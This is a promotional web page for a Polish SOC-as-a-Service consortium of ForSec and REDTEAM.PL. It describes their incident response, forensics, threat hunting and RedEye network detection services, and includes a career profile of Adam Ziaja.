# Security Operations Center (SOC)

We offer **SOC-as-a-Service**, outsourcing of the **SOC** / **CERT** teams, run by a consortium of two recognizable expert companies – **ForSec** and **REDTEAM.PL**. Thanks to the combination of many years of experience in the field of **computer forensics**, **incident response** and authorized **attack simulations**, we are able to effectively take care of the **cybersecurity** of the organization.

[Get a quote](/cdn-cgi/l/email-protection#8ae3e4ece5aca9babcbeb1aca9bbbbbeb1aca9bbbbbcb1aca9bbbab8b1aca9bbbbbfb1aca9bebcb1aca9bbbbb8b1aca9bbbab2b1)

## SOC-as-a-Service (SOCaaS)

We are a well-coordinated team cooperating with each other for almost a decade, which resulted in the formation of a consortium offering high-quality **SOC** and **CERT** / **CSIRT** services. **ForSec** is engaged in the implementation of the tasks of the 1st and 2nd line of specialists (**triage specialist**, **incident responder**, **computer forensics**), while the **REDTEAM.PL** is responsible for the 3rd, the last line of SOC (**threat hunter**) experts and the **CERT** team. For our Customers the **SOC** team works 24/7/365.

We have been involved in **cybersecurity** and **computer forensics** for over a dozen years, we are highly qualified in the field of both defensive (**blue team**) and offensive (**red team**) aspects of cybersecurity and a have a professional **computer forensics laboratory**. Therefore, we are able to offer a world-class **cybersecurity monitoring** service.

![](../images/logo_rt_fs_m.svg)

## CERT / CSIRT

**REDTEAM.PL CERT** ([RFC 2350](https://redteam.pl/rfc2350.pdf)) is a member of the international organization [Trusted Introducer](https://www.trusted-introducer.org/directory/teams/redteampl-pl.html) associating recognized **incident response** teams. In addition, **REDTEAM.PL** is also listed on the official website of the [European Network and Information Security Agency](https://www.enisa.europa.eu/topics/csirts-in-europe/csirt-inventory/certs-by-country-interactive-map#team=REDTEAM.PL) (**ENISA**) as the Polish incident response team (CERT / CSIRT).

[![Praktyczna analiza powłamaniowa](../images/praktyczna_analiza_powlamaniowa-thumb.png)](https://ksiegarnia.pwn.pl/Praktyczna-analiza-powlamaniowa%2C715723827%2Cp.html)

We have competences in the field of digital forensics and [incident response](https://redteam.pl/en/digital-forensics-incident-response.html), the result of which is a recognized scientific publication entitled “[Practical computer forensics analysis](https://ksiegarnia.pwn.pl/Praktyczna-analiza-powlamaniowa%2C715723827%2Cp.html)” (2017) published by Polish Scientific Publishers PWN. The leader of the third SOC line, [Adam Ziaja](https://redteam.pl/en/team.html) is co-authored of several documents of the **European Network and Information Security Agency** (**ENISA**) for CERT / CSIRT teams published in 2013-2014, regarding **computer forensics**, **threat hunting** and **threat intelligence** among other topics.

We know how **cybercriminals** exploit vulnerabilities because for over a decade we have been conducting authorized **whitehat attack simulations** in the form of [penetration tests](https://redteam.pl/en/penetration-testing.html) and [red teaming](https://redteam.pl/en/red-teaming.html), aimed at finding the weakest points in the organization – just like real attackers do.

Thanks to the combination of offensive and defensive competence, we are able to offer the high quality cybersecurity services.

## Threat hunting & threat intelligence

**Threat hunting** and **threat intelligence** are subjects that we have been dealing with for over a decade. We have technical competences and achievements related to **proactive threat hunting** as well as advanced incident response, including world-class **APT** (**Advanced Persistent Threat**).

In 2019, the REDTEAM.PL research team revealed a global [badWPAD attack](https://blog.redteam.pl/2019/05/sinkholing-badwpad-wpadblock-wpadblocking-com.html), which affected millions of computers around the world. Our study was [observed](https://isc.sans.edu/podcastdetail.html?id=6484) by SANS institute and we received thanks from national **incident response** teams, incl. Poland ([CERT Polska](https://twitter.com/CERT_Polska/status/1139528319337205760)), Estonia (CERT-EE) and Latvia (CERT-LV). In 2020, we described **TTPs** (ang. Tactics, Techniques, and Procedures) and **IOC** of advanced APT attacks, which we identified and analyzed – incl. cybercriminal groups [Sodinokibi / REvil](https://blog.redteam.pl/2020/05/sodinokibi-revil-ransomware.html) and [Black Kingdom](https://blog.redteam.pl/2020/06/black-kingdom-ransomware.html). Our actions resulted in the extensive cooperation with international law enforcement agencies (also in the role of **IT Expert Witness**).

We are able not only to analyze **0-day** vulnerabilities (software weakness for which there are no security patches yet) but also to identify them. Only at the turn of 2019/2020 we received numerous thanks from Google and a [total award of $68,000](https://blog.redteam.pl/2020/06/google-chrome-fuzzing-conclusion.html) for identified and responsibly reported **vulnerabilities** in the Chrome browser. In addition, as a result of the vulnerability found by our researcher in Apple Safari for macOS/iOS, the world's media, including [Forbes](https://www.forbes.com/sites/leemathews/2020/08/25/apple-safari-bug-steal-files/) magazine, wrote about it and again we were [observed](https://isc.sans.edu/podcastdetail.html?id=7138) by SANS institute – this time for offensive research. We also have a number of acknowledgments available on the official websites of entities to which we have responsibly reported **security vulnerabilities** over the course of many years, incl. Adobe (2014), Apple (2012), BlackBerry (2012), Deutsche Telekom, Google (2013), Harvard University, Netflix (2013), Nokia (2013), Reddit, SoundCloud, Yandex (2013). We are a team of **IT security experts** who have been successfully dealing with the technical aspects of cybersecurity for many years.

## Network threats detection

Typical products for detecting **network attacks** monitor communication and use hundreds of predefined rules for detection. The main disadvantage of this approach is the lack of understanding of most of the alerts reported. Numerous alerts appear regardless of whether an attack is taking place or not. In this way, despite having **security systems** in place, an attack often goes unnoticed because it is not identified in the maze of hundreds of warnings that appear constantly in the production environment.

During attacks, **hackers** use native mechanisms of Windows enviroment to obtain credentials. **Antivirus software** does not detect the presence of an attacker who logs in as a legitimate user. Antivirus detection is an analysis of how the software, not the user, works. **Cybercriminals** take advantage of this and carry out attacks not only against vulnerable software, which could very likely be detected by **EDR** (Endpoint Detection and Response) or **SOAR** (Security Orchestration, Automation, and Response) systems, but against standard mechanisms of Windows enviroment. Such attacks are not detected by the software installed on the client stations because they are performed on the level of the internal network between stations located in the Windows domain. In this way, APT (Advanced Persistent Threat) groups are able to gain access to data despite the fact that the organization has various types of security mechanisms deployed on workstations.

![RedEye](../images/04.svg)

REDTEAM.PL approach to **threat hunting** implemented in [RedEye](threat-hunting.html) solution is based on the knowledge of **attack techniques** (**TTPs**) and tools used by advanced adversaries. It is the only solution that can detect advanced attacks against the **Windows** environment and **Active Directory** (**AD**) without the need for an agent. Thanks to the understanding of both the offensive and defensive aspects, **RedEye** software implements rules that allow **detecting attacks** that are not identified by EDR software. Therefore, **RedEye** complements **antivirus** and related solutions.

## Cybersecurity research

The team of [REDTEAM.PL experts](https://redteam.pl/en/team.html) has published numerous articles on the [techblog](https://blog.redteam.pl) on the technical aspects of cybersecurity:

* [Threat hunting using DNS firewalls and data enrichment](https://blog.redteam.pl/2019/08/threat-hunting-dns-firewall.html) – How to build a **DNS firewall** engine.
* [Internal domain name collision](https://blog.redteam.pl/2019/10/internal-domain-name-collision-dns.html) – How to collide an internal DNS domain.
* [Sodinokibi / REvil / Maze ransomware (TTPs & IOC)](https://blog.redteam.pl/2020/05/sodinokibi-revil-ransomware.html) – We managed to secure and analyze the servers used in APT attacks.
* [DNS for red team purposes](https://blog.redteam.pl/2020/03/dns-c2-rebinding-fast-flux.html) – How to use DNS during attacks.
* [Deceiving blue teams using anti-forensic techniques](https://blog.redteam.pl/2020/01/deceiving-blue-teams-anti-forensic.html) – How can you deceive **blueteam**.
* [Bypassing LLMNR/NBT-NS honeypot](https://blog.redteam.pl/2019/10/bypassing-llmnr-nbns-honeypot.html) – How to cheat a **honeypot** recommended by **MITRE ATT&CK**.

we combine expertise both in the field of attack and defense, and our **cybersecurity research** is widely recognized in the world.

## Incident Response

The most important aspect of the **SOC** / **CERT** service is the competence of the technical team, because it is the level of knowledge of specialists that determines the **cybersecurity** of the organization. The so-called [pyramid of pain](https://detect-respond.blogspot.com/2013/03/the-pyramid-of-pain.html) that identifies which competence is the most difficult to obtain, in terms of both **threat hunting** and **incident response** is recognised worldwide. The top of the pyramid contains the most inaccessible and most desirable aspects of how cybercriminals (TTPs) work and what tools they use – this knowledge is [more than covered](https://redteam.pl/en/research.html) by the REDTEAM.PL team. On the other hand, the knowledge of system artifacts results directly from the real experience in **computer forensics** and the performance of the functions of **court experts** – both by ForSec and REDTEAM.PL teams. Furthermore, ForSec has the largest **digital forensics laboratory** in Poland, where dozens of **investigative analyzes**, including expert opinions, are carried out each month. On the other hand, knowledge about network artifacts results directly from REDTEAM.PL's creation of IDS / NIDS (Network Intrusion Detection System) software called [RedEye](threat-hunting.html), which uniquely detects attacks carried out in the local network. Malicious domains, IP addresses and hashes (**IOC**) information is provided by our **CTI** (**Cyber Threat Intelligence**) system, which receives information in cooperation with other international **incident response** teams. We are the only SOC team in Poland that consists of the computer forensics and offensive cybersecurity experts.

## Computer forensics

**ForSec** has the largest **digital forensics laboratory** in Poland, in which we conduct several dozen cases per month. The laboratory consists of a number of professional and certified software (including **FTK** Forensic Toolkit and **X-Ways** Forensics) and **computer forensics** equipment (including hardware **blockers**, **Logicube** disk copiers, **Cellebrite** products), allowing to properly secure and **analyze the evidence** from multiple digital mediums simultaneously. The laboratory field team performs **securing of digital evidence** (**binary copies**) throughout Poland 24/7. We are able to secure evidence even in five locations simultaneously. For many years we have also been providing trainings in computer forensics and **hacking** techniques.

![Laboratorium](../images/lab.jpg)

## Security incident

A hacker breach? Cybercriminals attack? Dishonest employee acting to damage the company? Personal data breach? We act as court experts and have over a dozen years of experience. Every day we help organizations to effectively counter cyber attacks. We deal with traces of activity, **forensic analysis**, **incident analysis**, **analysis of logs**, events and RAM memory.

In the event of an incident, the most important thing is to properly secure the traces. We do not recommend security measures taken by individuals not qualified in the field of computer forensics. Inefficient attempts to secure data leads to the overwriting of potentially important information and compromise the integrity of the evidence. Proper securing digital traces allows for an in-depth **analysis of the incident** and allows to determine the details of how it happened and what operations the attacker performed. In the event that the evidence material is not properly secured, system artifacts become obliterated over time – even if the user does not operate on it and the system is simply running. On the other hand, turning off the computer without prior proper protection leads to irretrievable loss of **volatile data**, which is stored in the operating system's memory, and which may contain important information for the incident analysis.

We are able to properly secure evidence by people who perform the functions of **IT Expert Witnesses** on a daily basis, as well as to properly analyze it using specialized equipment and software in conjunction with the highest competence in the field of computer forensics and incident response. We have the largest digital forensics laboratory in Poland, which analyzes dozens of cases each month for both law enforcement agencies and private organizations. We are able to physically, throughout Poland and not only, **secure digital evidence** by making **binary copies** properly with the use of specialized equipment that guarantees the **integrity of the evidence**.

## IT environment monitoring

Nowadays, digital security is the basis for the functioning of virtually every company, and therefore the most important thing is reaction speed. In our SOC, we use **dynamic defence** technologies that are used to detect new, never-before-seen types of threats (unique samples in targeted attacks). Each new sample is automatically analyzed in a **sandbox** that simulates user behavior to trick techniques to avoid **malware** detection.

[RedEye](threat-hunting.html) is our **IDS** / **NIDS** (Network Intrusion Detection System) software with a number of unique detection rules, which have been prepared on the basis of many years of experience in both [offensive](https://redteam.pl/en/penetration-testing.html) and [defensive](https://redteam.pl/en/digital-forensics-incident-response.html) cybersecurity. **RedEye** makes it possible to detect the initial phases of an attack in an organization's local network before it escalates, including **information leaks** and covering the tracks of a breach. Our solution allows to detect attacks and activities that are not detected by any **antivirus software** and **endpoint protection** / **EDR**. We offer **RedEye** together with the service of constant **monitoring of the IT environment** in the form of **SOC outsourcing**.

If the Client has already implemented a **SIEM** solution, we will use it in our work (with particular emphasis on **Splunk** and **ELK**). However, if the Client does not have a SIEM system, we will implement it as part of the **SOC service**.

We also provide services such as: **security testing** (**penetration testing**), **application security**, **cloud security assessments**, **vulnerability scans** and **vulnerability management** as well as **DLP**.

We are focused not only on detecting external threats (e.g. **economic espionage** / **industrial espionage**) but also on internal intruders (e.g. a rogue employee).

### Cyber Security Expert (Career Profile)

**Adam Ziaja** has been in the IT security field for over a dozen years, both working in IT related positions and extending his knowledge and experience as part of his after-work activities. Currently working as an **Principal Cyber Security Consultant** at own company [REDTEAM.PL](https://redteam.pl) ![REDTEAM.PL](assets/images/redteam.png) with services such as penetration testing (pentest), red teaming, cyber threat hunting i.a. intelligence (CTI), computer forensics and incident response (DFIR).

During his infosec career he made expert opinions for law enforcement and justice authorities (**computer forensics**), worked as an ICT security specialist at a **CSIRT** (aka CERT) team where he actively tracked cybercrime activity (**cyber threat intelligence**) focusing on preventing attacks on government and critical infrastructure, and moreover, worked as a full time **penetration tester** for one of the world's largest banking groups Royal Bank of Scotland (RBS), as well as performed penetration tests for other financial institutions (i.a. international banks, payment card issuers, insurers and cryptocurrency exchanges) and well known e-commerce companies. Last times he worked as **senior cyber security consultant** at one of the [big four companies](https://en.wikipedia.org/wiki/Big_Four_accounting_firms) Deloitte, where he was responsible for enterprise cyber risk services such as penetration testing, CPH **red teaming** and DFIR. Also worked as cyber security expert at a US startup focusing on new generation IDS/SIEM, responsible for research on **cyber threat hunting**.

Adam [co-authored](https://www.google.com/search?q=%22adam+ziaja%22+site%3Aenisa.europa.eu) training materials for CERT teams in cooperation with European Network and Information Security Agency (ENISA) i.a. “[Digital forensics](https://www.enisa.europa.eu/topics/trainings-for-cybersecurity-specialists/online-training-material/documents/digital-forensics-handbook)” (Sep 2013; task 1-2), “[Identifying and handling cybercrime traces](https://www.enisa.europa.eu/topics/trainings-for-cybersecurity-specialists/online-training-material/documents/identifying-and-handling-cybercrime-traces-handbook)” (Sep 2013; task 1-2, appendix 1-3) and “[Common Framework for Artifact Analysis Activities](https://www.enisa.europa.eu/topics/trainings-for-cybersecurity-specialists/online-training-material/documents/common-framework-for-artifact-analysis-activities-handbook)” (Dec 2014; 2-4 chapter). He also took part in ENISA Cyber Europe 2014 exercise (in which over 100 teams from all around Europe participated), where [his team scored first place](https://web.archive.org/web/20161109082039/http%3A//rcb.gov.pl/cyber-europe-2014/). In 2019, he received thanks from the European national CERT teams (i.a. [CERT-PL](https://twitter.com/CERT_Polska/status/1139528319337205760), [CERT-EE](references/certee.jpg) and [CERT-LV](references/certlv.jpg)) for stopping the biggest badWPAD attack, this was also featured in a podcast by the [SANS institute](https://isc.sans.edu/podcastdetail.html?id=6484).
